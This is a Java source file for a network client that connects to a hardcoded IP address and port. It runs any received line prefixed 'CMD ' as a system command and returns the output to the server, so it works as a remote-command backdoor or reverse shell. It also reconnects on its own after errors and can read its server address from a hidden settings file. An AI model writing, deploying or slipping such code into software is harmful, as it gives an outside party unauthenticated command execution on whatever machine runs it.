package Client;

import java.io.*;
import java.net.Socket;

public class Client {
    private static String HOST = "141.219.247.5";
    private static int PORT = 22122;
    private PrintWriter out;
    private BufferedReader in;
    private Socket socket;
    private String comm;

    public static String getHOST() {
        return HOST;
    }

    public static void setHOST(String HOST) {
        Client.HOST = HOST;
    }

    public static int getPORT() {
        return PORT;
    }

    public static void setPORT(int PORT) {
        Client.PORT = PORT;
    }

    public static void main(String[] args) {
        new Client().connect();
    }

    private void connect() {
//        loadServerSettings();
        try {
            socket = new Socket(getHOST(), getPORT());
            out = new PrintWriter(socket.getOutputStream());
            out.flush();
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            System.out.println("Client started: " + getHOST() + ":" + getPORT());
            do {
                comm = in.readLine();
                if (comm.contains("CMD ")) {
                    exec(comm.replace("CMD ", ""));
                }
                if(comm.equals("forciblyclose")){
                    out.println("forciblyclose");
                }
            } while (!comm.equals("forciblyclose"));

        } catch (IOException e1) {
            System.out.println("Disconnected... retrying.");
            connect();
        }
    }

    private void communicate(String msg) {
        out.println(msg);
        out.flush();
    }

    private void exec(String command) throws IOException {
        if (!command.equals("")) {
            System.out.println(command);
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader stdInput = new BufferedReader(new
                    InputStreamReader(p.getInputStream()));
            BufferedReader stdError = new BufferedReader(new
                    InputStreamReader(p.getErrorStream()));
            String s;
            System.out.println("HA");
            while ((s = stdInput.readLine()) != null) {
                communicate(s);
                System.out.println(s);
            }
            while ((s = stdError.readLine()) != null) {
                communicate(s);
                System.out.println(s);
            }
            communicate("end");
        }
    }

    private void loadServerSettings() {
        try (BufferedReader reader = new BufferedReader(new FileReader(".mauscs"))
        ) {
            String line;
            StringBuilder stringBuilder = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line);
            }
            String[] settings = stringBuilder.toString().split(" ");
            if (settings.length == 2) {
                setHOST(settings[0]);
                setPORT(Integer.parseInt(settings[1]));
            }
        } catch (IOException e) {
        }
    }
}
